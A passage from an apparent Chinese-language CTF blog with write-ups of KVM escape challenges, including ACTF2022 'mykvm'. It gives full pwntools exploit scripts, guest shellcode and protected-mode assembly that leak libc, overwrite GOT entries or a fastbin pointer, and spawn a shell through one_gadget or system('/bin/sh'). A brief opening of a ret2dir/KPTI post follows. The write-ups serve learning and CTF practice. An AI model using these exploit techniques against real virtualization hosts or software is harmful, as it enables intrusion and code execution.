class="keyword">import</span> interact</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&quot;./kvm&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov qword ptr [0x1000],0x2003</span></span><br><span class="line"><span class="string">mov qword ptr [0x2000],0x3003</span></span><br><span class="line"><span class="string">mov qword ptr [0x3000], 0x3</span></span><br><span class="line"><span class="string">mov qword ptr [0x0], 0x3</span></span><br><span class="line"><span class="string">mov qword ptr [0x8], 0x7003</span></span><br><span class="line"><span class="string">mov rax, 0x1000</span></span><br><span class="line"><span class="string">mov cr3, rax</span></span><br><span class="line"><span class="string">mov rax, 0x1050</span></span><br><span class="line"><span class="string">look_for_return:</span></span><br><span class="line"><span class="string">	add rax, 0x8</span></span><br><span class="line"><span class="string">	cmp qword ptr [rax], 0</span></span><br><span class="line"><span class="string">	je look_for_return</span></span><br><span class="line"><span class="string">add rax, 0x18</span></span><br><span class="line"><span class="string">mov rcx, qword ptr [rax]</span></span><br><span class="line"><span class="string">add rcx, 0x249e6</span></span><br><span class="line"><span class="string">mov qword ptr [rax], rcx</span></span><br><span class="line"><span class="string">hlt</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gdb.attach(sh,<span class="string">&#x27;b *(0x555555554000 +&#123;0&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="number">0xFD3</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    shellcode_len=<span class="built_in">len</span>(asm(shellcode))</span><br><span class="line"></span><br><span class="line">    sh.send(p32(shellcode_len))</span><br><span class="line">    sh.sendline(asm(shellcode))</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸€ä¸ªé—®é¢˜æˆ‘ç›®å‰ä¸èƒ½ç†è§£ï¼Œå°±æ˜¯ç»™ç¬¬å››çº§é¡µè¡¨ç¬¬0é¡¹è®¾ç½®é0çš„ç‰©ç†å†…å­˜ï¼Œç„¶åç¿»è¯‘çš„æ—¶å€™guestå°±ä¼šé€€å‡ºï¼Œç„¶åkvmçˆ†<code>KVM_EXIT_SHUTDOWN</code>çš„é€€å‡ºåŸå› ï¼Œç¬¬å››çº§é¡µè¡¨ç¬¬0é¡¹å¯¹åº”çš„è™šæ‹Ÿåœ°å€å°±æ˜¯0x0~0xfff,å¯èƒ½è¿™ä¸ªåœ°å€æœ‰å•¥ç‰¹æ®Šçš„å§,ä¸èƒ½éšä¾¿è®¾ç½®ã€‚</p>
<p>å¤ç°å®Œä¹‹åå‘ç°ä¹Ÿä¸æ˜¯å¾ˆéš¾ï¼Œä½†æ˜¯è‡ªå·±ä»å¼€å§‹å­¦ä¹ åˆ°å¤ç°ç”¨äº†å¿«ä¸€å‘¨çš„æ—¶é—´ï¼Œæˆ‘æ˜¯çŒªé¼»ï¼Œé™¤äº†ä¸Šè¿°åšæ³•ä¼ªé€ é¡µè¡¨ä¹‹å¤–ï¼Œæˆ‘è§‰å¾—ç†è®ºä¸Šè¿˜å­˜åœ¨ä¸€ç§åšæ³•ï¼Œå³ä»ä¿æŠ¤æ¨¡å¼ä¸­è¿”å›åˆ°å®æ¨¡å¼ï¼Œå°±å¯ä»¥ä¸ç”¨ä¼ªé€ é¡µè¡¨ç›´æ¥è¿›è¡Œä»»æ„<code>ç‰©ç†</code>åœ°å€è®¿é—®äº†ï¼Œä½†çœ‹äº†ä¸€äº›èµ„æ–™çœ‹ä¸æ‡‚æï¼Œåé¢æœ‰æ—¶é—´å†æ£é¼“æ£é¼“ã€‚</p>
<h3 id="ACTF2022-mykvm"><a href="#ACTF2022-mykvm" class="headerlink" title="ACTF2022  mykvm"></a>ACTF2022  mykvm</h3><p>å’Œä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œéƒ½æ˜¯è®¾ç½®vmçš„å†…å­˜æ—¶å¤§å°è®¾ç½®ä¸åˆç†ï¼Œå¯¼è‡´å¯ä»¥åœ¨guestå¯ä»¥è¶Šç•Œè®¿å­˜hostè¿›ç¨‹çš„ä¿¡æ¯ï¼Œæ¯”å¦‚åœ¨è¿™é“é¢˜ä¸­guestå¯ä»¥è®¿é—®åˆ°deståœ°å€ï¼Œç„¶åè¿˜å¯¹åˆ†é…ç»™guestçš„å†…å­˜ä¸æ¸…0ï¼Œå¯¼è‡´å¯ä»¥leakå‡ºæ ˆåœ°å€å’Œlibcåœ°å€ã€‚è¿™é“é¢˜ä¸€å…±æœ‰ä¸¤ç§è§£æ³•</p>
<h4 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h4><p>kvmè¿›å…¥guestçš„æ—¶å€™é»˜è®¤æ˜¯16ä½å®æ¨¡å¼çš„ï¼Œè§£æ³•ä¸€å°±æ˜¯åœ¨ç›´æ¥å®æ¨¡å¼ä¸­é€šè¿‡<code>out</code>æŒ‡ä»¤leakå‡ºlibcåœ°å€ï¼Œç„¶åä¿®æ”¹destæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘<code>puts_got</code>é™„è¿‘,åœ¨é€€å‡ºè™šæ‹Ÿæœºåæ‰§è¡Œ<code>memcpy(dest, *(const void **)&amp;nbytes[1], 0x20uLL);</code>æ—¶æŠŠgotè¡¨é¡¹æ”¹æˆogg,ç„¶åæ‰§è¡Œ<code>puts(&quot;Bye!&quot;);</code>æ¥getshell.ä¸è¿‡ç¨‹åºä½¿ç”¨readline()å‡½æ•°æ¥æ”¶æ•°æ®ï¼Œæ‰€ä»¥å­—ç¬¦å¿…é¡»æ˜¯å¯è§å­—ç¬¦ï¼Œè¿™å°±å¯¹oggåœ°å€çš„è¾“å…¥é€ æˆäº†å›°éš¾ï¼Œè§£å†³åŠæ³•æ˜¯åªå†™gotçš„åä¸‰ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯è¿™ä¸‰ä¸ªå­—èŠ‚ä¹Ÿæœ‰å¯èƒ½ä¸æ˜¯å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥å…·æœ‰ä¸€å®šæ¦‚ç‡æ€§ï¼Œæˆ‘çš„è„šæœ¬ä¹‹æ‰€ä»¥æ²¡æœ‰çˆ†ç ´åŸå› æ˜¯æˆ‘åœ¨æœ¬åœ°å¤ç°çš„ï¼Œè€Œä¸”æŠŠaslrå…³äº†ï¼Œæˆ‘ç›´æ¥é€‰äº†åä¸‰ä¸ªå­—ç¬¦æ˜¯å¯è§å­—ç¬¦çš„oggæ¥æ‰“çš„</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&quot;./mykvm&quot;</span>)</span><br><span class="line">kvm=ELF(<span class="string">&quot;./mykvm&quot;</span>)</span><br><span class="line">puts_got=kvm.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.code16</span></span><br><span class="line"><span class="string">mov bx, 0x3f8</span></span><br><span class="line"><span class="string">get_libc:</span></span><br><span class="line"><span class="string">    mov al, byte ptr [bx]</span></span><br><span class="line"><span class="string">    out 1,al</span></span><br><span class="line"><span class="string">    add bx, 1</span></span><br><span class="line"><span class="string">    cmp bx,0x400</span></span><br><span class="line"><span class="string">    jne get_libc</span></span><br><span class="line"><span class="string">mov bx,0x7100</span></span><br><span class="line"><span class="string">mov byte ptr [bx], 0x0b</span></span><br><span class="line"><span class="string">mov byte ptr [bx+1], 0x20</span></span><br><span class="line"><span class="string">mov byte ptr [bx+2], 0x60</span></span><br><span class="line"><span class="string">hlt</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh,<span class="string">&#x27;b *(0x400000 +&#123;0&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x1127</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;your code size: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;your code: &quot;</span>)</span><br><span class="line">    sh.send(shellcode)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;guest name: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;jingyinghua&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;guest passwd: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;123123&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;123123\n&quot;</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    libc_base=u64(sh.recv(<span class="number">8</span>))-<span class="number">0x8149d8</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;host name: &quot;</span>)</span><br><span class="line">    ogg_addr=libc_base+<span class="number">0xf1247</span></span><br><span class="line">    sh.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1d</span>+p32(ogg_addr&amp;<span class="number">0xffffff</span>))</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>åœ¨å®æ¨¡å¼ä¸­å¯ä»¥é€šè¿‡æ®µå¯„å­˜å™¨:[é€šç”¨å¯„å­˜å™¨]æ¥è¾¾åˆ°2^20çš„å¯»å€ï¼Œä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡é€šç”¨å¯„å­˜å™¨æ¥å¯»å€æ¯”å¦‚<code>mov byte ptr [bx], 0x0b</code>,ä½†æ³¨æ„åœ°å€ä¸èƒ½è¶…è¿‡0x10000</p>
<h4 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h4><p>ç›¸è¾ƒäºè§£æ³•å°±éº»çƒ¦å¾ˆå¤šï¼Œè€Œä¸”ä¹Ÿæ˜¯çˆ†ç ´ï¼Œå’Œè§£æ³•ä¸€ç›¸æ¯”ç¨³å®šæ€§å·®ä¸å¤šå§ï¼Œè¿™ç§è§£æ³•å°±æ˜¯è®¾ç½®gdtç«¯æè¿°è¡¨ï¼Œç„¶åä¿®æ”¹cr0å¯„å­˜è¿›å…¥ä¿æŠ¤æ¨¡å¼ï¼Œè¿›å…¥ä¿æŠ¤æ¨¡å¼é»˜è®¤å°±è¿›å…¥äº†32ä½ï¼Œè¿™æ ·å¯»å€èŒƒå›´å°±é«˜è¾¾4Gï¼Œå°±å¯ä»¥ç›´æ¥åˆ©ç”¨<code>0x60a100</code>é‡Œçš„å †åœ°å€,ç„¶åç„¶ååˆ©ç”¨è¿™ä¸ªæŒ‡é’ˆæ³„éœ²libcåœ°å€ï¼Œç„¶åä¿®æ”¹0x40çš„fastbinä¸Šçš„ç¬¬ä¸€ä¸ªå †å—çš„fdä¸º<code>0x602032</code>,è¿™æ®µç©ºé—´åœ¨<code>memcpy_got</code>é™„è¿‘ï¼Œç„¶åä¿®æ”¹destæŒ‡é’ˆæŒ‡å‘çš„å †å—ä¿å­˜â€™/bin/shâ€™å­—ç¬¦ä¸²ï¼Œåœ¨é€€å‡ºè™šæ‹Ÿæœºåå°±å¯ä»¥åˆ©ç”¨readlineå‡½æ•°ç”³è¯·åˆ°è¿™æ®µç©ºé—´ï¼Œç„¶åä¿®æ”¹<code>memcpy_got</code>åä¸¤ä¸ªå­—èŠ‚ä¸º<code>do_system</code>åœ°å€ã€‚æœ€åå°±æ˜¯æ‰§è¡Œ<code>memcpy(des)</code>ç›¸å½“äºæ‰§è¡Œäº†<code>system(&#39;/bin/sh&#39;)</code>,ä½†æ˜¯ç”±äºreadlineå‡½æ•°ä¼šå¯¹å­—ç¬¦æœ€åæ¸…é›¶<code>\x00</code>,æ‰€ä»¥å¾—çˆ†ç ´è®©<code>do_system</code>åœ°å€çš„å€’æ•°ç¬¬ä¸‰ä¸ªå­—èŠ‚ä¸º0æ‰è¡Œï¼Œè¿™ä¸ªå¾—çˆ†ä¸€ä¼šã€‚</p>
<p>äº¤äº’è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> S</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">kvm=ELF(<span class="string">&quot;./mykvm&quot;</span>)</span><br><span class="line">puts_got=kvm.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"><span class="comment"># shellcode=asm(&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># hlt</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    sh=process(<span class="string">&quot;./mykvm&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(sh,&#x27;b *(0x400000 +&#123;0&#125;)&#x27;.format(0x10EE))</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;your code size: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;your code: &quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        code = f.read()</span><br><span class="line">    sh.send(code)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;guest name: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;guest passwd: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    libc_base = u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3c5540</span></span><br><span class="line">    system_addr=libc_base+<span class="number">0x44e30</span></span><br><span class="line">    <span class="keyword">if</span> ((system_addr&gt;&gt;<span class="number">0x10</span>)&amp;<span class="number">0xff</span>)==<span class="number">0</span>:</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;host name: &quot;</span>)</span><br><span class="line">        sh.sendline(<span class="string">&quot;b&quot;</span>*<span class="number">0x2e</span>+p16(system_addr&amp;<span class="number">0xffff</span>))</span><br><span class="line">        sh.interactive()</span><br><span class="line">    sh.close()</span><br></pre></td></tr></table></figure>

<p>æ±‡ç¼–ä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">cli</span><br><span class="line">lgdt [gdt_descriptor]</span><br><span class="line">mov eax,cr0</span><br><span class="line">or eax,0x1</span><br><span class="line">mov cr0, eax</span><br><span class="line">code:</span><br><span class="line">    mov ax, 0x10        ; å°†æ•°æ®æ®µå¯„å­˜å™¨dså’Œé™„åŠ æ®µå¯„å­˜å™¨esç½®ä¸º0x10</span><br><span class="line">    mov ds, ax         </span><br><span class="line">    mov es, ax</span><br><span class="line">    mov fs, ax          ; fså’Œgså¯„å­˜å™¨ç”±æ“ä½œç³»ç»Ÿä½¿ç”¨ï¼Œè¿™é‡Œç»Ÿä¸€è®¾æˆ0x10</span><br><span class="line">    mov gs, ax</span><br><span class="line">    mov ax, 0x18        ; å°†æ ˆæ®µå¯„å­˜å™¨ssç½®ä¸º0x18</span><br><span class="line">    mov ss, ax</span><br><span class="line">    mov ebp, 0x7c00     ; ç°åœ¨æ ˆé¡¶æŒ‡å‘ 0x7c00</span><br><span class="line">    mov esp, ebp</span><br><span class="line"></span><br><span class="line">    mov eax, [0x7100]</span><br><span class="line">    add eax, 0x1bc8</span><br><span class="line">    sub eax, 0x603000</span><br><span class="line">    mov ecx, [eax]</span><br><span class="line">    mov edx, [eax+4]</span><br><span class="line">    mov eax, ecx</span><br><span class="line">get_libc1:</span><br><span class="line">    out 1,al</span><br><span class="line">    shr eax, 8</span><br><span class="line">    cmp eax, 0</span><br><span class="line">    jne get_libc1</span><br><span class="line"></span><br><span class="line">mov eax, edx</span><br><span class="line">get_libc2:</span><br><span class="line">    out 1,al</span><br><span class="line">    shr eax, 8</span><br><span class="line">    cmp eax, 0</span><br><span class="line">    jne get_libc2</span><br><span class="line"></span><br><span class="line">chang_fastbin_binsh_to_dest:</span><br><span class="line">    mov eax, [0x7100]</span><br><span class="line">    add eax, 0x13670</span><br><span class="line">    sub eax, 0x603000</span><br><span class="line">    mov edx, 0x602032</span><br><span class="line">    mov [eax], edx</span><br><span class="line">    </span><br><span class="line">    mov eax, [0x7100]</span><br><span class="line">    sub eax, 0x603000</span><br><span class="line">    mov edx,  0x6e69622f</span><br><span class="line">    mov [eax], edx</span><br><span class="line">    mov edx, 0x68732f</span><br><span class="line">    mov [eax+4], edx</span><br><span class="line">hlt</span><br><span class="line">gdt_start:</span><br><span class="line">gdt_null:</span><br><span class="line">    dd 0</span><br><span class="line">    dd 0</span><br><span class="line"></span><br><span class="line">gdt_code:</span><br><span class="line">    dw 0xffff</span><br><span class="line">    dw 0x0</span><br><span class="line">    db 0x0</span><br><span class="line">    db 10011010b</span><br><span class="line">    db 11001111b </span><br><span class="line">    db 0x0</span><br><span class="line">gdt_data:</span><br><span class="line">    dw 0xffff</span><br><span class="line">    dw 0x0</span><br><span class="line">    db 0x0</span><br><span class="line">    db 10010010b</span><br><span class="line">    db 11001111b</span><br><span class="line">    db 0</span><br><span class="line"></span><br><span class="line">gdt_stack:</span><br><span class="line">    dw 0xffff</span><br><span class="line">    dw 0x0</span><br><span class="line">    db 0x0</span><br><span class="line">    db 10010010b</span><br><span class="line">    db 01000000b</span><br><span class="line">    db 0</span><br><span class="line">gdt_end:</span><br><span class="line"></span><br><span class="line">gdt_descriptor:</span><br><span class="line">dw gdt_end-gdt_start-1</span><br><span class="line">dd gdt_start</span><br></pre></td></tr></table></figure>

<p>å¼€å¯ä¿æŠ¤æ¨¡å¼å…‰è®¾ç½®æ®µæè¿°è¡¨gdtè¿˜ä¸å¤Ÿï¼Œè¿˜å¾—è®¾ç½®ä¸€äº›æ®µå¯„å­˜å™¨ï¼Œç„¶åkvmä¸€ç›´çˆ†<code>KVM_EXIT_SHUTDOWN</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/05/ret2dir-KPTI/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/05/ret2dir-KPTI/" class="post-title-link" itemprop="url">ret2dir&KPTI</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-06-05 23:16:49 / ä¿®æ”¹æ—¶é—´ï¼š23:17:30" itemprop="dateCreated datePublished" datetime="2022-06-05T23:16:49+08:00">2022-06-05</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ret2dir-amp-KPTI"><a href="#ret2dir-amp-KPTI" class="headerlink" title="ret2dir&amp;KPTI"></a>ret2dir&amp;KPTI</h1><p>è®°å½•ä¸€ä¸‹è¥¿ç”µçš„kgadgetè§£é¢˜è¿‡ç¨‹ä»¥åŠå­¦åˆ°çš„çŸ¥è¯†ç‚¹ï¼Œæ‹–äº†ä¸€ä¸ªå¤šæœˆäº†ï¼Œè¿˜æ˜¯å¾ˆæœ‰è´¨é‡çš„ä¸€é“é¢˜ï¼Œæ˜¯å­¦ä¹ ret2dirå¾ˆå¥½çš„æ¿å­é¢˜ã€‚</p>
<h2 id="0x1-ret2dir"><a href="#0x1-ret2dir" class="headerlink" title="0x1 ret2dir"></a>0x1 ret2dir</h2><h3 id="0x1-1-åŸç†"><a href="#0x1-1-åŸç†" class="headerlink" title="0x1.1 åŸç†"></a>0x1.1 åŸç†</h3><p>è¿™æ˜¯2014å¹´æå‡ºçš„ä¸€ä¸ªæ”»å‡»æ‰‹æ®µï¼Œä¸»è¦æ˜¯çœ‹è®ºæ–‡çš„ç¿»è¯‘ç†è§£çš„ï¼ˆæ´‹æ–‡çœŸçš„çœ‹ä¸ä¸‹å»ï¼‰ï¼Œç†è§£äº†ä»¥året2dirçš„åŸç†ä¹Ÿä¸æ˜¯éå¸¸å¤æ‚ï¼Œä¸»è¦å°±æ˜¯ä¾é å†…æ ¸åœ°å€ç©ºé—´çš„ä¸€æ®µåœ°å€(physmap)å’Œç‰©ç†åœ°å€çº¿æ€§æ˜ å°„é€ æˆçš„åˆ«ååœ°å€æ¥ç»•è¿‡smepå’Œsmapã€‚</p>
<p><img src="https://p1.ssl.qhimg.com/t01b3da93b49c8c210f.png" alt="img"></p>
